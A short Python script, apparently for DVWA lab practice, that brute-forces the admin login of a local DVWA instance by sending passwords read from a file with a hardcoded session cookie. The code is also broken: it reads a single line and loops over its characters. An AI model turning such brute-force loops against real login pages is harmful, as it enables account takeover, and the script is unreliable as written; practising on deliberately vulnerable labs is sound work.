import requests


url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"
password_file = open("pasword.txt","r")
password_str = password_file.readline()
for password in password_str:
    password = password.replace("\n","")
    param = {"username" : "admin" , "password" : password ,"Login" :"Login"}
    cookie ={"security":"low", "PHPSESSID":"d80lfk4i81thqk2hhbpppl9a3h"}
    # You must get this PHPSESSID from your browser cookie
    req = requests.get(url,params=param,cookies=cookie)
    req.cookies
    txt = req.text
    print(txt)
    if "Welcome" in txt:
        print("password is : ",password)

    
            
            
            
    


